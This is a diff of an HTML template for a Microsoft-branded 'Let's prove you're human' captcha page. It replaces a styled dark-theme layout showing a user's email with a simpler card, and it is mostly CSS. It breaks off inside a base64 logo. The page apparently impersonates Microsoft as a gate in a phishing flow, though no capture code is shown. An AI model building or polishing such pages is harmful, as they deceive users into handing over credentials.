@@ -2,833 +2,134 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 23 23'%3E%3Cpath fill='%23f35325' d='M0 0h11v11H0z'/%3E%3Cpath fill='%2381bc06' d='M12 0h11v11H12z'/%3E%3Cpath fill='%2305a6f0' d='M0 12h11v11H0z'/%3E%3Cpath fill='%23ffba08' d='M12 12h11v11H12z'/%3E%3C/svg%3E">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Let's prove you're human</title>
-    
     <style>
-
-:root {
-            --colorNeutralBackground1: #292929;
-            --colorNeutralStroke2: #525252;
-            --borderRadiusCircular: 10000px;
-            --fontFamilyBase: "Segoe UI", sans-serif;
-            --colorNeutralForeground3: #adadad;
-
-    /* Dynamic theme mapping variables */
-    --canvasBg: #292929;
-    --containerBg: #292929;
-    --textColor: #ffffff;
-    --subTextColor: #d6d6d6;
-        }
-
-html, body {
-    margin: 0;
-    padding: 0;
-    width: 100%;
-    min-height: 100vh; /* Use min-height, not height */
-    overflow-y: auto;  /* Allow content to push if it exceeds screen */
-    overflow-x: hidden;
-
-    background-size: cover;
-    background-position: center;
-    background-attachment: fixed;
-}
-
-       /* Add this inside your <style> block */
-.bg-img {
-    display: block !important; /* Force it to show */
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100vw !important;  /* Force width to match the full screen width instantly */
-    height: 100vh !important; /* Force height to match the full screen height instantly */
-    object-fit: cover !important; /* Forces the image to always fill the entire height/width seamlessly */
-    transform: translateZ(0);   /* Replaces 'cover' so it doesn't recalculate proportions on load */
-    z-index: -100 !important; /* Put it behind everything */
-}
-
-.page-wrapper {
-    display: flex;
-    flex-direction: column;
-    height: 100vh;      /* Use height, not min-height, to lock the screen */
-    width: 100%;
-    position: relative; /* Essential for absolute positioning of the footer */
-    overflow: hidden;   /* Ensures nothing causes a scrollbar */
-     /* ADD THIS LINE HERE */
-    
-}
-        
-#signInContainer {
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    position: relative;
-    top: -30px;
-    left: auto;
-    transform: none;
-    width: 440px;
-    margin: auto;
-    
-    /* Updated padding: 40px top/sides, 80px bottom for extra space */
-    padding: 40px 40px 60px 40px;
-    
-    box-sizing: border-box;
-    background-color: #292929 !important;
-    border-radius: 12px;
-    box-shadow: 0 8px 16px rgba(0,0,0,0.28);
-    z-index: 10;
-     opacity: 1 !important; /* Keep its base style solid */
-}
-/* Animate the inner contents purely without modifying the parent bounds */
-.animation-fade-layer {
-    opacity: 0;
-    animation: simpleFadeIn 0.7s ease-in-out forwards;
-}
-
-@keyframes simpleFadeIn {
-    0% {
-        opacity: 0;
-    }
-    100% {
-        opacity: 1;
-    }
-}
-
-        
-
-/* 3. New Footer Style */
-.page-footer {
-    position: static;
-    bottom: 15px;       /* This pins it exactly 30px from the bottom edge */
-    left: 0;
-    width: 100%;
-    text-align: center;
-    color: var(--colorNeutralForeground3);
-    font-family: var(--fontFamilyBase);
-    font-size: 12px;
-    z-index: 5;  
-    flex-shrink: 0;       /* Keeps it above the background */
-}
-
-.footer-links {
-    display: flex;
-    justify-content: center;
-    flex-wrap: wrap;
-    /* Replacing the variable with a fixed value to ensure it's spacious */
-    gap: 8px; 
-    margin-bottom: 1px; /* Adds space between links and the notice text */
-}
-
-.footer-links a {
-    color: #D6D6D6 !important;
-    text-decoration: none;
-    font-weight: 400; /* Makes the font bold/weighty */
-    /* Adds internal padding to make each link easier to see and click */
-    padding: 4px 8px; 
-    white-space: nowrap; /* Prevents the links from breaking onto two lines */
-}
-
-.footer-links a:hover {
-    text-decoration: underline;
-    color: #ffffff; /* Brighter color on hover looks better on dark themes */
-}
-
-.footer-notice {
-    /* 1. Force explicit px values as a fallback */
-    font-size: 10px !important;
-    line-height: 15px !important;
-    font-weight: 400 !important;
-    
-    /* 2. Keep these for consistency */
-    font-family: "Segoe UI", sans-serif !important;
-    color: #D6D6D6 !important;
-    
-    /* 3. Layout */
-    display: flex;
-    justify-content: center;
-    width: 100%;
-    margin-top: 1px; /* Using explicit px for reliability */
-    text-align: center;
-}
-
-.footer-notice a {
-    color: #479ef5 !important;
-    text-decoration: none !important;
-    font-weight: 600 !important; /* Makes it stand out slightly */
-    font-size: 10px !important;  /* Ensures it stays small */
-    margin-left: 4px;     
-    cursor: pointer;       /* Adds a tiny gap before "Learn more" */
-}
-
-.footer-notice a:hover {
-    color: #62abf5 !important; /* A slightly lighter blue for hover */
-    text-decoration: underline !important;
-}
-
-/* For Desktop */
-@media (min-width: 520px) {
-    .page-footer {
-        position: absolute;
-        bottom: 15px;
-        left: 0;
-    }
-}
-
-/* Mobile Responsive Override */
-@media (max-width: 519px) {
-    html, body {
-        height: 100% !important;
-        width: 100% !important;
-        overflow: hidden !important; 
-    }
-
-    .page-wrapper {
-        height: 100% !important;
-        width: 100% !important;
-        overflow: hidden !important;
-        justify-content: flex-start !important;
-        /* ADD THIS EXACT LINE */
-        background-color: var(--containerBg) !important; 
-    }
-    
-    #signInContainer {
-        position: relative;
-        top: 0;
-        left: 0;
-        transform: none;
-        width: 100vw !important;
-        min-height: 100vh;
-        border-radius: 0 !important;
-        box-shadow: none !important;
-        justify-content: flex-start;
-        box-sizing: border-box;
-        display: flex;
-        flex-direction: column;
-        overflow-y: hidden;
-        
-        /* Updated padding: 40px top, 40px sides, 80px bottom */
-        padding: 25px 40px 80px 40px !important;
-    }
-    
-    .page-footer {
-        position: fixed; /* Fixes it to the screen bottom */
-        bottom: 25px;
-        left: 16px;
-        right: 16px;
-        background-color: #292929; /* Ensure background is solid so text behind it doesn't show */
-        padding-bottom: 0; 
-        z-index: 100;
-        aling-items: center;
-        text-align: center;
-        display: flex;
-        flex-direction: column; 
-        box-sizing: border-box; 
-        flex-wrap: wrap;       /* Allows links to drop to a new line if they run out of space */
-        justify-content: center;
-        width: auto;
-        
-    }
-
-    
-}
-
-
-        .logo { 
-    width: 114px; 
-    height: 24px; 
-    margin-bottom: 24px; /* Slightly more space between logo and email */
-    display: block; 
-    margin-left: auto;
-    margin-right: auto; /* Ensures it stays centered */
-}
-
-        .email-pill {
-            display: inline-flex;
+        body {
+            font-family: 'Segoe UI', sans-serif;
+            background: #f2f2f2;
+            display: flex;
+            justify-content: center;
             align-items: center;
-            border: 1px solid var(--colorNeutralStroke2);
-            border-radius: var(--borderRadiusCircular);
-            padding: 0 8px;
-            height: 30px;
-            margin-top: 8px;
-            margin-bottom: 7px;
+            min-height: 100vh;
+            margin: 0;
         }
-
-        #bannerText { font-family: var(--fontFamilyBase); color: var(--colorNeutralForeground3); font-size: 12px; font-weight: 600; }
-
-     h2 {
-    /* Font settings */
-    font-family: "Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif !important;
-    font-weight: 600 !important; 
-    font-size: 24px !important;
-    line-height: 32px !important;
-    color: #ffffff !important;
-    letter-spacing: -0.2px !important;
-    
-    /* Layout */
-    display: block !important;
-    width: 100% !important;
-    text-align: center !important;
-    
-    /* THE FIX: 
-       margin: 10px auto 20px auto; 
-       Top is 10px, Right is auto, Bottom is 20px, Left is auto.
-    */
-    margin: 5px auto 20px auto !important; 
-    
-    box-sizing: border-box !important;
-    -webkit-font-smoothing: antialiased !important;
-    -moz-osx-font-smoothing: grayscale !important;
-}
-
-/* 1. Ensure the container doesn't have a background or border */
-.captcha-box {
-    background: transparent;
-    border: none;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    padding: 0;
-    margin-top: -10px; /* Adjust this negative value to pull it up as much as you want */
-    margin-bottom: 10px; /* Removes spacing between image and box edge */
-}
-
-/* 2. Ensure the image itself doesn't have borders or shadows */
-.captcha-box img {
-    border: none;
-    outline: none;
-    display: block; /* Removes the tiny space underneath the image */
-    max-width: 100%;
-}
-    .instruction {
-    /* Font settings */
-    font-family: "Segoe UI", sans-serif !important; /* Forces the font */
-    font-size: 14px !important; /* Or var(--fontSizeBase300) */
-    
-    /* Color settings */
-    color: #d6d6d6 !important; /* This matches your --colorNeutralForeground2 */
-    
-    /* Layout */
-    text-align: center;
-    margin: 8px 0 14px 0;
-}
-/* Container: Prevent items from wrapping and force them to stay in a row */
-.captcha-wrapper {
-    display: flex;
-    align-items: center;
-    justify-content: flex-start;
-    gap: 8px;
-    margin-top: 20px;
-    flex-wrap: nowrap; /* Ensures they stay on one line */
-}
-
-/* Icon: Fixed size, no shrinking */
-.fixed-icon, .button-icon {
-    width: 40px;
-    height: 40px;
-    flex-shrink: 0; /* Keeps the circle perfect */
-}
-.icon-action-button {
-    background: transparent !important; /* Removes the white/gray background square */
-    border: none !important;            /* Removes the default button border outline */
-    padding: 0 !important;             /* Removes internal spacing shifting the icon */
-    margin: 0 !important;              /* Removes default outer margins */
-    cursor: pointer !important;        /* Makes it show a clickable pointer hand on hover */
-    display: inline-flex !important;   /* Keeps the layout aligned cleanly with the pill button */
-    outline: none !important;          /* Removes default focus boxes */
-    flex-shrink: 0 !important;         /* Keeps the button structural size stable */
-    transition: opacity 0.15s ease-in-out !important; /* Prepares it for the smooth faint transition */
-}
-/* Keeps the icon permanently faint after it has been clicked */
-.icon-action-button.faint-icon {
-    opacity: 0.2 !important;
-    cursor: default !important;
-    pointer-events: none !important; /* Disables all further hover effects or clicks */
-}
-        
-
-.icon-action-button:hover {
-    opacity: 0.8 !important;
-}
-/* This makes the icon look faint when you press and hold it */
-.icon-action-button:active {
-    opacity: 0.2 !important;
-}
-
-/* The Pill Button: Prevent shrinking */
-.pill-button {
-    display:inline-flex;
-    align-items: center;          /* Explicitly centers child text vertically */
-    justify-content: center; 
-    height: 40px; 
-    padding: 0 55px; 
-    border: 1px solid #0078d4; 
-    border-radius: 50px;
-    cursor: pointer;
-    background-color: white;
-    user-select: none;
-    -webkit-tap-highlight-color: transparent;
-    box-sizing: border-box; 
-    transition: background-color 0.2s;
-    outline: 0 !important;
-    flex-shrink: 0; /* Prevents the pill from squishing */
-    position: relative;
-    overflow: hidden;
-    width: 232px !important;
-}
-
-/* Text styles: Prevent text from forcing the pill to swell */
-.ZpICXubljzwSSUY {
-    display: inline-block;
-    vertical-align: middle;
-    text-align: center;
-    text-transform: none;
-    margin: 0;
-    padding: 0;
-    white-space: nowrap; /* Forces text to stay on one line */
-    font-family: 'Segoe UI', sans-serif; /* Fixed font syntax */
-    font-size: 15px !important;
-    color: #0f6cbd;
-    font-weight: 600;
-    cursor: pointer;
-    user-select: none;
-}
-/* Force your text layer to stay floating on top of the blue fill */
-.pill-button > .ZpICXubljzwSSUY {
-    position: relative !important;
-    z-index: 2 !important;
-    pointer-events: none !important; /* Clicks go straight through to the button */
-}
-
-/* When the button is being held down, change the text color to a lighter grayish blue */
-.pill-button.pressed > .ZpICXubljzwSSUY {
-    color: #D3D3D3 !important;
-}
-/* The blue progress fill layer */
-.pill-button .progress-fill {
-    position: absolute !important;
-    top: 0 !important;
-    left: 0 !important;
-    height: 100% !important;
-    width: 0%;                  /* Managed strictly by JavaScript */
-    background-color: #0f6cbd;  /* The exact blue color */
-    z-index: 2 !important;      /* Sits behind text, above button background */
-    pointer-events: none !important;
-    transition: width 0.1s linear; /* Smooth fill motion */
-    overflow: hidden;
-}
-
-/* 2. ADD JUST THIS SPECIFIC LAYER CHAIN RIGHT BELOW IT */
-.pill-button .progress-fill .ZpICXubljzwSSUY {
-    position: absolute !important;
-    top: 0 !important;
-    left: 0 !important;
-    width: 232px !important;       /* Matches the inner width of your pill button cleanly */
-    height: 100% !important;
-    box-sizing: border-box !important;
-    display: flex !important;      /* Changed from table-cell to clean flex */
-    align-items: center !important;/* Forces pixel-perfect vertical centering */
-    justify-content: center !important; /* Centers the text horizontally */
-    padding: 0 !important;         /* Removes the 8px padding that was shifting it up */
-}
-
-/* Container to hide and perfectly center the dots inside the button */
-/* Container to hide and perfectly center the dots inside the button */
-.pill-button .loading-dots {
-    position: absolute !important;
-    top: 50% !important;
-    left: 50% !important;
-    transform: translate(-50%, -50%) !important;
-    z-index: 3 !important;
-    display: none; /* Controlled by JavaScript flex switch */
-    gap: 5px;      /* Clear spacing between dots */
-
-     
-    
-}
-/* New helper layout block to center inline items vertically inside an absolute layer */
-
-
-/* Style each individual dot into a small, perfectly round circle */
-.pill-button .loading-dots .dot {
-    width: 12px;
-    height: 11px;
-    background-color: #ffffff; /* Kept exactly black */
-     border-radius: 6px / 8px;       /* Keeps the top and bottom edges perfectly rounded */
-    
-    opacity: 0.3;
-    animation: dotFade 1.2s infinite ease-in-out both;
-}
-
-/* Create the smooth sequential step across the three dots */
-.pill-button .loading-dots .dot:nth-child(1) {
-    animation-delay: 0s;
-}
-.pill-button .loading-dots .dot:nth-child(2) {
-    animation-delay: 0.2s;
-}
-.pill-button .loading-dots .dot:nth-child(3) {
-    animation-delay: 0.4s;
-}
-
-/* The clean fade animation loop (No bouncing, no scaling) */
-@keyframes dotFade {
-    0%, 100% {
-        opacity: 0.3; /* Faded state */
-    }
-    50% {
-        opacity: 1;   /* Fully illuminated white state */
-    }
-}
-/* Container to hide and perfectly center the checkmark inside the button */
-.pill-button .success-checkmark {
-    position: absolute !important;
-    top: 50% !important;
-    left: 50% !important;
-    transform: translate(-50%, -50%) !important;
-    z-index: 3 !important;
-    display: none; /* Controlled by JavaScript display switches */
-    width: 20px;   /* Clean, visible size matching the layout */
-    height: 20px;
-}
-
-.pill-button .success-checkmark svg {
-    width: 100%;
-    height: 100%;
-    display: block;
-}
-
-/* Select the actual line inside the SVG to apply the drawing animation */
-.pill-button .success-checkmark svg polyline {
-    stroke-dasharray: 50;  /* Sets the length of the dash line loop */
-    stroke-dashoffset: -50; /* Squeezes the line out of view initially */
-    
-    /* When JavaScript sets the container to display: block, this animation triggers */
-    animation: drawCheckmark 0.5s ease-in-out forwards, fadeOutCheckmark 0.4s ease-in-out 1.8s forwards;
-}
-
-/* The keyframe animation that creates the literal drawing motion */
-@keyframes drawCheckmark {
-    to {
-        stroke-dashoffset: 0; /* Smoothly rolls the line into view */
-    }
-}
-
-/* 2. Smooth fade out right before the loading dots arrive */
-@keyframes fadeOutCheckmark {
-    to {
-        opacity: 0;
-        transform: scale(0.8); /* Gives a slight shrinking effect as it drops away */
-    }
-}
-
-        
-
-/* Clean Light Theme Overrides */
-body.light-theme {
-    --colorNeutralBackground1: #ffffff;
-    --colorNeutralForeground3: #666666;
-    background-color: #ffffff !important;
-    --colorNeutralStroke2: #e0e0e0; 
-
-    /* ADD THESE THEME VARIABLE DEFINITIONS HERE */
-    --canvasBg: #ffffff;
-    --containerBg: #ffffff; 
-    --textColor: #000000;
-    --subTextColor: #505050;
-}
-
-/* Allow the background SVG asset to show through the layout layers on desktop, */
-/* but keep it solid white on mobile to mask layout flashing on reload */
-body.light-theme .page-wrapper {
-    background-color: var(--containerBg) !important;
-}
-
-@media (min-width: 520px) {
-    body.light-theme .page-wrapper {
-        background-color: transparent !important;
-    }
-}
-
-body.light-theme .page-footer {
-    background-color: transparent !important;
-}
-
-
-/* Force the login container box to be white with sharp contrast text */
-body.light-theme #signInContainer {
-    background-color: #ffffff !important;
-    color: #333333 !important;
-    box-shadow: 0 8px 16px rgba(0, 0, 0, 0.08);
-}
-
-body.light-theme h2 {
-    color: #000000 !important;
-}
-
-body.light-theme .instruction {
-    color: #666666 !important;
-}
-
-body.light-theme .footer-links a,
-body.light-theme .footer-notice {
-    color: #666666 !important;
-}
-
-/* Shifts the Microsoft logo wordmark text color to dark gray for visibility */
-body.light-theme svg[data-testid="microsoftLogo"] path:nth-child(1) {
-    fill: #6b6b6b !important;
-}
-
-
-
-</style>
-</head> 
+        .card {
+            background: #fff;
+            padding: 40px 44px;
+            max-width: 440px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+            text-align: center;
+            border-radius: 4px;
+        }
+        .logo {
+            width: 114px;
+            margin-bottom: 24px;
+        }
+        h2 {
+            font-weight: 600;
+            font-size: 24px;
+            margin: 0 0 12px 0;
+        }
+        p {
+            color: #555;
+            font-size: 14px;
+            margin: 0 0 20px 0;
+        }
+        .btn {
+            display: inline-block;
+            background: #0067b8;
+            color: #fff;
+            border: none;
+            padding: 12px 32px;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .btn:hover {
+            background: #005da6;
+        }
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        .btn.loading {
+            background: #005da6;
+            pointer-events: none;
+        }
+        .btn.success {
+            background: #107c10;
+        }
+        .btn .spinner {
+            display: none;
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 0.8s linear infinite;
+            vertical-align: middle;
+            margin-right: 8px;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
 <body>
-    
-    
-    <div class="page-wrapper">
-   <div class="animation-fade-layer" style="width: 100%; height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: inherit;">
-    <div id="signInContainer">
-        <svg data-testid="microsoftLogo" class="logo" viewBox="0 0 114 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                 <path d="M47.2997 5.30006V19.7001H44.7997V8.40006H44.7664L40.2997 19.7001H38.633L34.0664 8.40006H34.033V19.7001H31.733V5.30006H35.333L39.4664 15.9667H39.533L43.8997 5.30006H47.2997ZM49.3664 6.40006C49.3664 6.00006 49.4997 5.66673 49.7997 5.40006C50.0997 5.1334 50.433 5.00006 50.833 5.00006C51.2664 5.00006 51.633 5.1334 51.8997 5.4334C52.1664 5.70006 52.333 6.0334 52.333 6.4334C52.333 6.8334 52.1997 7.16673 51.8997 7.4334C51.5997 7.70006 51.2664 7.8334 50.833 7.8334C50.3997 7.8334 50.0664 7.70006 49.7997 7.4334C49.533 7.10006 49.3664 6.76673 49.3664 6.40006ZM52.0664 9.36673V19.7001H49.633V9.36673H52.0664ZM59.433 17.9334C59.7997 17.9334 60.1997 17.8334 60.633 17.6667C61.0664 17.5001 61.4664 17.2667 61.833 17.0001V19.2667C61.433 19.5001 60.9997 19.6667 60.4997 19.7667C59.9997 19.8667 59.4664 19.9334 58.8664 19.9334C57.333 19.9334 56.0997 19.4667 55.1664 18.5001C54.1997 17.5334 53.733 16.3001 53.733 14.8334C53.733 13.1667 54.233 11.8001 55.1997 10.7334C56.1664 9.66673 57.533 9.1334 59.333 9.1334C59.7997 9.1334 60.233 9.20006 60.6997 9.30006C61.1664 9.4334 61.533 9.56673 61.7997 9.70006V12.0334C61.433 11.7667 61.033 11.5334 60.6664 11.4001C60.2664 11.2334 59.8664 11.1667 59.4664 11.1667C58.4997 11.1667 57.733 11.4667 57.133 12.1001C56.533 12.7334 56.233 13.5667 56.233 14.6334C56.233 15.6667 56.4997 16.5001 57.0664 17.0667C57.6997 17.6334 58.4664 17.9334 59.433 17.9334ZM68.733 9.20006C68.933 9.20006 69.0997 9.20006 69.2664 9.2334C69.433 9.26673 69.5664 9.30006 69.6664 9.3334V11.8001C69.533 11.7001 69.3664 11.6334 69.0997 11.5334C68.8664 11.4334 68.5664 11.4001 68.1997 11.4001C67.5997 11.4001 67.0997 11.6667 66.6997 12.1667C66.2997 12.6667 66.0664 13.4334 66.0664 14.5001V19.7001H63.633V9.36673H66.0664V11.0001H66.0997C66.333 10.4334 66.6664 10.0001 67.0997 9.66673C67.5664 9.36673 68.0997 9.20006 68.733 9.20006ZM69.7997 14.7001C69.7997 13.0001 70.2664 11.6334 71.233 10.6334C72.1997 9.6334 73.533 9.1334 75.2664 9.1334C76.8664 9.1334 78.133 9.60006 79.033 10.5667C79.933 11.5334 80.3997 12.8334 80.3997 14.4667C80.3997 16.1334 79.933 17.4667 78.9664 18.4667C77.9997 19.4667 76.6997 19.9667 75.033 19.9667C73.433 19.9667 72.1664 19.5001 71.233 18.5667C70.2664 17.6001 69.7997 16.3001 69.7997 14.7001ZM72.333 14.6001C72.333 15.6667 72.5664 16.5001 73.0664 17.0667C73.5664 17.6334 74.2664 17.9334 75.1664 17.9334C76.0664 17.9334 76.733 17.6334 77.1997 17.0667C77.6664 16.5001 77.8997 15.6667 77.8997 14.5334C77.8997 13.4334 77.6664 12.6001 77.1664 12.0334C76.6997 11.4667 76.033 11.2001 75.1664 11.2001C74.2664 11.2001 73.5997 11.5001 73.0997 12.1001C72.5664 12.6667 72.333 13.5001 72.333 14.6001ZM83.9997 12.1001C83.9997 12.4334 84.0997 12.7334 84.333 12.9334C84.5664 13.1334 85.033 13.3667 85.7997 13.6667C86.7664 14.0667 87.4664 14.5001 87.833 14.9667C88.233 15.4667 88.433 16.0334 88.433 16.7334C88.433 17.7001 88.0664 18.5001 87.2997 19.0667C86.5664 19.6667 85.533 19.9667 84.2664 19.9667C83.833 19.9667 83.3664 19.9001 82.833 19.8001C82.2997 19.7001 81.8664 19.5667 81.4997 19.4001V17.0001C81.933 17.3001 82.433 17.5667 82.933 17.7334C83.433 17.9001 83.8997 18.0001 84.333 18.0001C84.8664 18.0001 85.2997 17.9334 85.533 17.7667C85.7997 17.6001 85.933 17.3667 85.933 17.0001C85.933 16.6667 85.7997 16.3667 85.533 16.1667C85.2664 15.9334 84.733 15.6667 83.9997 15.3667C83.0997 15.0001 82.4664 14.5667 82.0997 14.1001C81.733 13.6334 81.533 13.0334 81.533 12.3001C81.533 11.3667 81.8997 10.6001 82.633 10.0001C83.3664 9.40006 84.333 9.10006 85.4997 9.10006C85.8664 9.10006 86.2664 9.1334 86.6997 9.2334C87.133 9.30006 87.533 9.4334 87.833 9.5334V11.8334C87.4997 11.6334 87.133 11.4334 86.6997 11.2667C86.2664 11.1001 85.833 11.0334 85.433 11.0334C84.9664 11.0334 84.5997 11.1334 84.3664 11.3001C84.133 11.5334 83.9997 11.7667 83.9997 12.1001ZM89.4664 14.7001C89.4664 13.0001 89.933 11.6334 90.8997 10.6334C91.8664 9.6334 93.1997 9.1334 94.933 9.1334C96.533 9.1334 97.7997 9.60006 98.6997 10.5667C99.5997 11.5334 100.066 12.8334 100.066 14.4667C100.066 16.1334 99.5997 17.4667 98.633 18.4667C97.6664 19.4667 96.3664 19.9667 94.6997 19.9667C93.0997 19.9667 91.833 19.5001 90.8997 18.5667C89.9664 17.6001 89.4664 16.3001 89.4664 14.7001ZM91.9997 14.6001C91.9997 15.6667 92.233 16.5001 92.733 17.0667C93.233 17.6334 93.933 17.9334 94.833 17.9334C95.733 17.9334 96.3997 17.6334 96.8664 17.0667C97.333 16.5001 97.5664 15.6667 97.5664 14.5334C97.5664 13.4334 97.333 12.6001 96.833 12.0334C96.3664 11.4667 95.6997 11.2001 94.833 11.2001C93.933 11.2001 93.2664 11.5001 92.7664 12.1001C92.2664 12.6667 91.9997 13.5001 91.9997 14.6001ZM108.133 11.3667H104.5V19.7001H102.033V11.3667H100.3V9.36673H102.033V7.9334C102.033 6.8334 102.4 5.96673 103.1 5.26673C103.8 4.56673 104.7 4.2334 105.8 4.2334C106.1 4.2334 106.366 4.2334 106.6 4.26673C106.833 4.30007 107.033 4.3334 107.2 4.40007V6.50006C107.133 6.46673 106.966 6.40006 106.766 6.3334C106.566 6.26673 106.333 6.2334 106.066 6.2334C105.566 6.2334 105.166 6.40006 104.9 6.70006C104.633 7.0334 104.5 7.50006 104.5 8.10006V9.3334H108.133V7.00006L110.566 6.26673V9.3334H113.033V11.3334H110.566V16.1667C110.566 16.8001 110.666 17.2667 110.9 17.5001C111.133 17.7667 111.5 17.9001 112 17.9001C112.133 17.9001 112.3 17.8667 112.5 17.8001C112.7 17.7334 112.866 17.6667 113.033 17.5667V19.5667C112.866 19.6667 112.633 19.7334 112.266 19.8001C111.9 19.8667 111.566 19.9001 111.2 19.9001C110.166 19.9001 109.4 19.6334 108.9 19.0667C108.4 18.5334 108.133 17.7001 108.133 16.6001V11.3667Z" fill="#FFFFFF"></path><path d="M13.2383 13.2383H24.5V24.5H13.2383V13.2383Z" fill="#FFB900"></path><path d="M0.5 13.2383H11.7617V24.5H0.5V13.2383Z" fill="#00A4EF"></path><path d="M13.2383 0.5H24.5V11.7617H13.2383V0.5Z" fill="#7FBA00"></path><path d="M0.5 0.5H11.7617V11.7617H0.5V0.5Z" fill="#F25022"></path></svg>
-        
-        <% if (displayUser) { %>
-    <div class="email-pill"> 
-        <div id="bannerText"><%= displayUser %></div> 
-    </div>
-<% } %>
-        
-        <h2>Let's prove you're human</h2>
-        <div class="captcha-box">
-    
-        <img id="captcha-img" alt="Captcha" src="">
-    
+<div class="card">
+    <img class="logo" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDgiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAxMDggMjQiPjxwYXRoIGQ9Ik00NC44MzYsNC42VjE4LjRoLTIuNFY3LjU4M0g0Mi40TDM4LjExOSwxOC40SDM2LjUzMUwzMi4xNDIsNy41ODNoLS4wMjlWMTguNEgyOS45VjQuNmgzLjQzNkwzNy4zLDE0LjgzaC4wNThMNDEuNTQ1LDQuNlptMiwxLjA0OWExLjI2OCwxLjI2OCwwLDAsMSwuNDE5LS45NjcsMS40MTMsMS40MTMsMCwwLDEsMS0uMzksMS4zOTIsMS4zOTIsMCwwLDEsMS4wMi40LDEuMywxLjMsMCwwLDEsLjQuOTU4LDEuMjQ4LDEuMjQ4LDAsMCwxLS40MTQuOTUzLDEuNDI4LDEuNDI4LDAsMCwxLTEuMDEuMzg1QTEuNCwxLjQsMCwwLDEsNDcuMjUsNi42YTEuMjYxLDEuMjYxLDAsMCwxLS40MDktLjk0OE00OS40MSwxOC40SDQ3LjA4MVY4LjUwN0g0OS40MVptNy4wNjQtMS42OTRhMy4yMTMsMy4yMTMsMCwwLDAsMS4xNDUtLjI0MSw0LjgxMSw0LjgxMSwwLDAsMCwxLjE1NS0uNjM1VjE4YTQuNjY1LDQuNjY1LDAsMCwxLTEuMjY2LjQ4MSw2Ljg4Niw2Ljg4NiwwLDAsMS0xLjU1NC4xNjQsNC43MDcsNC43MDcsMCwwLDEtNC45MTgtNC45MDgsNS42NDEsNS42NDEsMCwwLDEsMS40LTMuOTMyLDUuMDU1LDUuMDU1LDAsMCwxLDMuOTU1LTEuNTQ1LDUuNDE0LDUuNDE0LDAsMCwxLDEuMzI0LjE2OCw0LjQzMSw0LjQzMSwwLDAsMSwxLjA2My4zOXYyLjIzM2E0Ljc2Myw0Ljc2MywwLDAsMC0xLjEtLjYxMSwzLjE4NCwzLjE4NCwwLDAsMC0xLjE1LS4yMTcsMi45MTksMi45MTksMCwwLDAtMi4yMjMuOSwzLjM3LDMuMzcsMCwwLDAtLjg0NywyLjQxNiwzLjIxNiwzLjIxNiwwLDAsMCwuODEzLDIuMzM4LDIuOTM2LDIuOTM2LDAsMCwwLDIuMjA5LjgzN002NS40LDguMzQzYTIuOTUyLDIuOTUyLDAsMCwxLC41LjAzOSwyLjEsMi4xLDAsMCwxLC4zNzUuMXYyLjM1OGEyLjA0LDIuMDQsMCwwLDAtLjUzNC0uMjU1LDIuNjQ2LDIuNjQ2LDAsMCwwLS44NTItLjEyLDEuODA4LDEuODA4LDAsMCwwLTEuNDQ4LjcyMiwzLjQ2NywzLjQ2NywwLDAsMC0uNTkyLDIuMjIzVjE4LjRINjAuNTI1VjguNTA3aDIuMzI5djEuNTU5aC4wMzhBMi43MjksMi43MjksMCwwLDEsNjMuODU1LDguOCwyLjYxMSwyLjYxMSwwLDAsMSw2NS40LDguMzQzbTEsNS4yNTRBNS4zNTgsNS4zNTgsMCwwLDEsNjcuNzkyLDkuNzFhNS4xLDUuMSwwLDAsMSwzLjg1LTEuNDM0LDQuNzQyLDQuNzQyLDAsMCwxLDMuNjIzLDEuMzgxLDUuMjEyLDUuMjEyLDAsMCwxLDEuMywzLjcyOSw1LjI1Nyw1LjI1NywwLDAsMS0xLjM4NiwzLjgzLDUuMDE5LDUuMDE5LDAsMCwxLTMuNzcyLDEuNDI0LDQuOTM1LDQuOTM1LDAsMCwxLTMuNjUyLTEuMzUyQTQuOTg3LDQuOTg3LDAsMCwxLDY2LjQwNiwxMy42bTIuNDI1LS4wNzdhMy41MzUsMy41MzUsMCwwLDAsLjcsMi4zNjgsMi41MDUsMi41MDUsMCwwLDAsMi4wMTEuODE4LDIuMzQ1LDIuMzQ1LDAsMCwwLDEuOTM0LS44MTgsMy43ODMsMy43ODMsMCwwLDAsLjY2NC0yLjQyNSwzLjY1MSwzLjY1MSwwLDAsMC0uNjg4LTIuNDExLDIuMzg5LDIuMzg5LDAsMCwwLTEuOTI5LS44MTMsMi40NCwyLjQ0LDAsMCwwLTEuOTg4Ljg1MiwzLjcwNywzLjcwNywwLDAsMC0uNzA3LDIuNDNtMTEuMi0yLjQxNmExLDEsMCwwLDAsLjMxOC43ODUsNS40MjYsNS40MjYsMCwwLDAsMS40LjcxNyw0Ljc2Nyw0Ljc2NywwLDAsMSwxLjk1OSwxLjI1NiwyLjYsMi42LDAsMCwxLC41NjMsMS42ODlBMi43MTUsMi43MTUsMCwwLDEsODMuMiwxNy43OTRhNC41NTgsNC41NTgsMCwwLDEtMi45Ljg0Nyw2Ljk3OCw2Ljk3OCwwLDAsMS0xLjM2Mi0uMTQ5LDYuMDQ3LDYuMDQ3LDAsMCwxLTEuMjY1LS4zOHYtMi4yOWE1LjczMyw1LjczMywwLDAsMCwxLjM2Ny43LDQsNCwwLDAsMCwxLjMyOC4yNiwyLjM2NSwyLjM2NSwwLDAsMC